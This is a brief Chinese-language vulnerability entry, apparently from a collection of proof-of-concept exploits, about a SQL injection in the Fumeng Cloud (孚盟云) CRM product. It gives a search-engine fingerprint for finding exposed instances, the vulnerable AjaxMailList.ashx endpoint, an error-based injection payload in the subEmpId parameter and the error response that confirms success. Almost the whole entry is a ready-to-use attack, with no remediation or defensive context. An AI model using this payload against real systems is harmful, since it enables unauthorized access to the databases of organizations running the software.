# 浮盟云AjaxMailList存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxMailList.ashx HTTP/1.1`

**Payload**
```
method=&subEmpId=1')and 1<user--
```
- **响应特征**：500 Nvarchar